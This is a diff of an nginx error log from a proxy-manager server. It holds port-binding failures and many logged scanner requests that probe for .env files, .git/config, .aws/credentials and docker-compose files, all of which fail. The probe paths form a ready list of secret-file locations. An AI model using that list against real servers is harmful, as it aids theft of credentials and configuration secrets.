@@ -1,206 +1,213 @@
-2025/03/09 14:10:39 [warn] 154#154: the "user" directive makes sense only if the master process runs with super-user privileges, ignored in /etc/nginx/nginx.conf:4
-2025/03/09 20:10:39 [warn] 154#154: the "user" directive makes sense only if the master process runs with super-user privileges, ignored in /etc/nginx/nginx.conf:4
-2025/03/10 02:10:39 [warn] 154#154: the "user" directive makes sense only if the master process runs with super-user privileges, ignored in /etc/nginx/nginx.conf:4
-2025/03/10 08:10:39 [warn] 154#154: the "user" directive makes sense only if the master process runs with super-user privileges, ignored in /etc/nginx/nginx.conf:4
-2025/03/10 09:36:57 [error] 176#176: *4 open() "/var/www/html/.env.backup" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.backup HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:57 [error] 174#174: *5 open() "/var/www/html/config.json" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /config.json HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:57 [error] 174#174: *6 open() "/var/www/html/settings/.env" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /settings/.env HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:57 [error] 174#174: *7 open() "/var/www/html/files/.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /files/.git/config HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:57 [error] 174#174: *8 open() "/var/www/html/.env.prod" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.prod HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:57 [error] 174#174: *9 open() "/var/www/html/config/.env" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /config/.env HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:57 [error] 174#174: *10 open() "/var/www/html/data/.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /data/.git/config HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:57 [error] 174#174: *11 open() "/var/www/html/project/.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /project/.git/config HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:57 [error] 174#174: *12 open() "/var/www/html/www/.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /www/.git/config HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:57 [error] 174#174: *13 open() "/var/www/html/.aws/credentials" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.aws/credentials HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:57 [error] 174#174: *14 open() "/var/www/html/.env.dev.local" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.dev.local HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:57 [error] 174#174: *15 open() "/var/www/html/.env.testing" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.testing HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:57 [error] 174#174: *16 open() "/var/www/html/.env.uat" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.uat HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:57 [error] 174#174: *17 open() "/var/www/html/static../.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /static../.git/config HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:57 [error] 174#174: *18 open() "/var/www/html/.env.config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.config HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:57 [error] 174#174: *19 open() "/var/www/html/.env.dist" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.dist HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:57 [error] 174#174: *20 open() "/var/www/html/admin/.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /admin/.git/config HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:57 [error] 175#175: *21 open() "/var/www/html/.env.local" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.local HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:57 [error] 175#175: *22 open() "/var/www/html/.env_sample" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env_sample HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:57 [error] 175#175: *23 open() "/var/www/html/build/.env" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /build/.env HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:57 [error] 175#175: *24 open() "/var/www/html/.env.test" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.test HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:57 [error] 175#175: *25 open() "/var/www/html/app/.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /app/.git/config HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:57 [error] 175#175: *26 open() "/var/www/html/configuration/.env" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /configuration/.env HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:57 [error] 175#175: *27 open() "/var/www/html/public/.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /public/.git/config HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:57 [error] 175#175: *28 open() "/var/www/html/src/.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /src/.git/config HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:57 [error] 175#175: *29 open() "/var/www/html/api/.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /api/.git/config HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:57 [error] 175#175: *30 open() "/var/www/html/server/.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /server/.git/config HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:58 [error] 175#175: *31 open() "/var/www/html/.env.ci" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.ci HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:58 [error] 175#175: *32 open() "/var/www/html/.env.development.local" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.development.local HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:58 [error] 175#175: *33 open() "/var/www/html/.env.production" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.production HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:58 [error] 175#175: *34 open() "/var/www/html/.env.secret" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.secret HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:58 [error] 175#175: *35 open() "/var/www/html/.env.default" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.default HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:58 [error] 175#175: *36 open() "/var/www/html/.env.staging.local" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.staging.local HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:58 [error] 177#177: *37 open() "/var/www/html/assets../.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /assets../.git/config HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:58 [error] 177#177: *38 open() "/var/www/html/media../.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /media../.git/config HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:58 [error] 177#177: *39 open() "/var/www/html/docker-compose.prod.yml" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /docker-compose.prod.yml HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:58 [error] 177#177: *40 open() "/var/www/html/.env.dev" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.dev HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:58 [error] 177#177: *41 open() "/var/www/html/.env.save" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.save HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:58 [error] 177#177: *42 open() "/var/www/html/media/.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /media/.git/config HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:58 [error] 177#177: *43 open() "/var/www/html/dev/.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /dev/.git/config HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:58 [error] 177#177: *44 open() "/var/www/html/.env.production.local" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.production.local HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:58 [error] 177#177: *45 open() "/var/www/html/.env.sandbox" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.sandbox HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:58 [error] 177#177: *46 open() "/var/www/html/api/.env" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /api/.env HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:58 [error] 177#177: *47 open() "/var/www/html/cms/.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /cms/.git/config HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:58 [error] 177#177: *48 open() "/var/www/html/core/.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /core/.git/config HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:58 [error] 177#177: *49 open() "/var/www/html/config/.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /config/.git/config HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:58 [error] 177#177: *50 open() "/var/www/html/.env.bak" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.bak HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:58 [error] 177#177: *51 open() "/var/www/html/.env.live" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.live HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:58 [error] 177#177: *52 open() "/var/www/html/.env.preprod" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.preprod HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:58 [error] 176#176: *53 open() "/var/www/html/prod/.env" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /prod/.env HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:58 [error] 176#176: *54 open() "/var/www/html/.env.template" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.template HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:58 [error] 176#176: *55 open() "/var/www/html/.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.git/config HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:58 [error] 176#176: *56 open() "/var/www/html/backup/.git/config" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /backup/.git/config HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:58 [error] 176#176: *57 open() "/var/www/html/.env" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env HTTP/1.1", host: "207.180.195.219"
-2025/03/10 09:36:58 [error] 176#176: *58 open() "/var/www/html/.env.stage" failed (2: No such file or directory), client: 45.148.10.34, server: localhost-nginx-proxy-manager, request: "GET /.env.stage HTTP/1.1", host: "207.180.195.219"
-2025/03/11 08:12:15 [emerg] 152#152: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:15 [emerg] 152#152: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:15 [emerg] 152#152: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:15 [emerg] 152#152: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:15 [emerg] 152#152: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:15 [emerg] 152#152: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:15 [emerg] 152#152: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:15 [emerg] 152#152: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:15 [emerg] 152#152: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:15 [emerg] 152#152: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:15 [emerg] 152#152: still could not bind()
-2025/03/11 08:12:19 [emerg] 188#188: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:19 [emerg] 188#188: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:19 [emerg] 188#188: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:19 [emerg] 188#188: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:19 [emerg] 188#188: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:19 [emerg] 188#188: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:19 [emerg] 188#188: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:19 [emerg] 188#188: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:19 [emerg] 188#188: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:19 [emerg] 188#188: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:19 [emerg] 188#188: still could not bind()
-2025/03/11 08:12:22 [emerg] 191#191: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:22 [emerg] 191#191: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:22 [emerg] 191#191: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:22 [emerg] 191#191: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:22 [emerg] 191#191: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:22 [emerg] 191#191: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:22 [emerg] 191#191: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:22 [emerg] 191#191: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:22 [emerg] 191#191: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:22 [emerg] 191#191: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:22 [emerg] 191#191: still could not bind()
-2025/03/11 08:12:26 [emerg] 194#194: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:26 [emerg] 194#194: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:26 [emerg] 194#194: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:26 [emerg] 194#194: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:26 [emerg] 194#194: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:26 [emerg] 194#194: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:26 [emerg] 194#194: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:26 [emerg] 194#194: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:26 [emerg] 194#194: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:26 [emerg] 194#194: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:26 [emerg] 194#194: still could not bind()
-2025/03/11 08:12:29 [emerg] 197#197: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:29 [emerg] 197#197: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:29 [emerg] 197#197: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:29 [emerg] 197#197: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:29 [emerg] 197#197: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:29 [emerg] 197#197: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:29 [emerg] 197#197: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:29 [emerg] 197#197: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:29 [emerg] 197#197: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:29 [emerg] 197#197: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:29 [emerg] 197#197: still could not bind()
-2025/03/11 08:12:33 [emerg] 200#200: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:33 [emerg] 200#200: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:33 [emerg] 200#200: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:33 [emerg] 200#200: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:33 [emerg] 200#200: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:33 [emerg] 200#200: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:33 [emerg] 200#200: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:33 [emerg] 200#200: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:33 [emerg] 200#200: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:33 [emerg] 200#200: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:33 [emerg] 200#200: still could not bind()
-2025/03/11 08:12:36 [emerg] 203#203: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:36 [emerg] 203#203: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:36 [emerg] 203#203: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:36 [emerg] 203#203: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:36 [emerg] 203#203: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:36 [emerg] 203#203: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:36 [emerg] 203#203: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:36 [emerg] 203#203: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:36 [emerg] 203#203: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:36 [emerg] 203#203: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:36 [emerg] 203#203: still could not bind()
-2025/03/11 08:12:40 [emerg] 206#206: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:40 [emerg] 206#206: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:40 [emerg] 206#206: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:40 [emerg] 206#206: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:40 [emerg] 206#206: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:40 [emerg] 206#206: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:40 [emerg] 206#206: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:40 [emerg] 206#206: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:40 [emerg] 206#206: bind() to 0.0.0.0:80 failed (98: Address already in use)
-2025/03/11 08:12:40 [emerg] 206#206: bind() to [::]:80 failed (98: Address already in use)
-2025/03/11 08:12:40 [emerg] 206#206: still could not bind()
-2025/03/11 08:17:51 [emerg] 1800#1800: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:17:52 [emerg] 1829#1829: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:17:53 [emerg] 1832#1832: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:17:54 [emerg] 1840#1840: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:17:56 [emerg] 1845#1845: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:17:57 [emerg] 1848#1848: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:17:58 [emerg] 1851#1851: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:17:59 [emerg] 1854#1854: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:18:00 [emerg] 1857#1857: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:18:01 [emerg] 1860#1860: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:18:02 [emerg] 1863#1863: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:18:03 [emerg] 1866#1866: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:18:04 [emerg] 1869#1869: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:18:05 [emerg] 1872#1872: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:18:06 [emerg] 1875#1875: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:18:07 [emerg] 1878#1878: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:18:08 [emerg] 1881#1881: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:18:09 [emerg] 1884#1884: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:18:10 [emerg] 1887#1887: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:18:11 [emerg] 1890#1890: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:18:12 [emerg] 1893#1893: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:18:14 [emerg] 1896#1896: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:18:15 [emerg] 1899#1899: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:18:16 [emerg] 1902#1902: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:18:17 [emerg] 1905#1905: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:18:18 [emerg] 1908#1908: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:18:19 [emerg] 1911#1911: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:18:20 [emerg] 1914#1914: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:18:21 [emerg] 1917#1917: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:18:22 [emerg] 1920#1920: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:18:23 [emerg] 1923#1923: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:18:24 [emerg] 1926#1926: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:18:25 [emerg] 1929#1929: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:18:26 [emerg] 1932#1932: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:18:27 [emerg] 1935#1935: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:18:28 [emerg] 1938#1938: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:18:29 [emerg] 1941#1941: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:19:45 [emerg] 1799#1799: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:19:46 [emerg] 1830#1830: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:19:47 [emerg] 1839#1839: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:19:48 [emerg] 1842#1842: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:19:49 [emerg] 1845#1845: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:19:50 [emerg] 1848#1848: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:19:51 [emerg] 1851#1851: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:19:52 [emerg] 1854#1854: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:19:53 [emerg] 1857#1857: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:19:55 [emerg] 1860#1860: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:19:56 [emerg] 1863#1863: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:19:57 [emerg] 1866#1866: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:19:58 [emerg] 1869#1869: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:19:59 [emerg] 1872#1872: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:20:00 [emerg] 1875#1875: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:20:01 [emerg] 1878#1878: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:20:02 [emerg] 1881#1881: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:20:03 [emerg] 1884#1884: bind() to 0.0.0.0:80 failed (13: Permission denied)
-2025/03/11 08:57:53 [error] 188#188: *416 open() "/var/www/html/.env.bak" failed (2: No such file or directory), client: 47.242.86.9, server: localhost-nginx-proxy-manager, request: "GET /.env.bak HTTP/1.1", host: "207.180.195.219"
-2025/03/11 09:07:10 [error] 210#210: *1978 open() "/var/www/html/index.htm" failed (2: No such file or directory), client: 185.100.87.136, server: localhost-nginx-proxy-manager, request: "POST /index.htm HTTP/1.1", host: "207.180.195.219"
-2025/03/11 09:07:10 [error] 210#210: *1979 open() "/var/www/html/FD873AC4-CF86-4FED-84EC-4BD59C6F17A7" failed (2: No such file or directory), client: 185.100.87.136, server: localhost-nginx-proxy-manager, request: "POST /FD873AC4-CF86-4FED-84EC-4BD59C6F17A7 HTTP/1.1", host: "207.180.195.219"
-2025/03/11 09:14:11 [error] 213#213: *2027 open() "/var/www/html/test.php" failed (2: No such file or directory), client: 176.126.103.21, server: localhost-nginx-proxy-manager, request: "GET /test.php HTTP/1.1", host: "207.180.195.219"
+2025/03/16 10:40:15 [error] 277#277: *39007 open() "/var/www/html/.env.dev" failed (2: No such file or directory), client: 45.148.10.90, server: localhost-nginx-proxy-manager, request: "GET /.env.dev HTTP/1.1", host: "207.180.195.219"
+2025/03/16 10:40:15 [error] 276#276: *39008 open() "/var/www/html/production/.git/config" failed (2: No such file or directory), client: 45.148.10.90, server: localhost-nginx-proxy-manager, request: "GET /production/.git/config HTTP/1.1", host: "207.180.195.219"
+2025/03/16 10:40:15 [error] 276#276: *39009 open() "/var/www/html/temp/.git/config" failed (2: No such file or directory), client: 45.148.10.90, server: localhost-nginx-proxy-manager, request: "GET /temp/.git/config HTTP/1.1", host: "207.180.195.219"
+2025/03/16 10:40:15 [error] 276#276: *39010 open() "/var/www/html/templates/.git/config" failed (2: No such file or directory), client: 45.148.10.90, server: localhost-nginx-proxy-manager, request: "GET /templates/.git/config HTTP/1.1", host: "207.180.195.219"
+2025/03/16 11:28:56 [error] 276#276: *39576 "/var/www/html/webui/index.html" is not found (2: No such file or directory), client: 64.62.156.150, server: localhost-nginx-proxy-manager, request: "GET /webui/ HTTP/1.1", host: "207.180.195.219"
+2025/03/16 11:31:34 [error] 274#274: *41089 "/var/www/html/geoserver/web/index.html" is not found (2: No such file or directory), client: 64.62.156.145, server: localhost-nginx-proxy-manager, request: "GET /geoserver/web/ HTTP/1.1", host: "207.180.195.219"
+2025/03/16 11:37:24 [error] 274#274: *41138 open() "/var/www/html/.env" failed (2: No such file or directory), client: 176.65.134.16, server: localhost-nginx-proxy-manager, request: "GET /.env HTTP/1.1", host: "207.180.195.219"
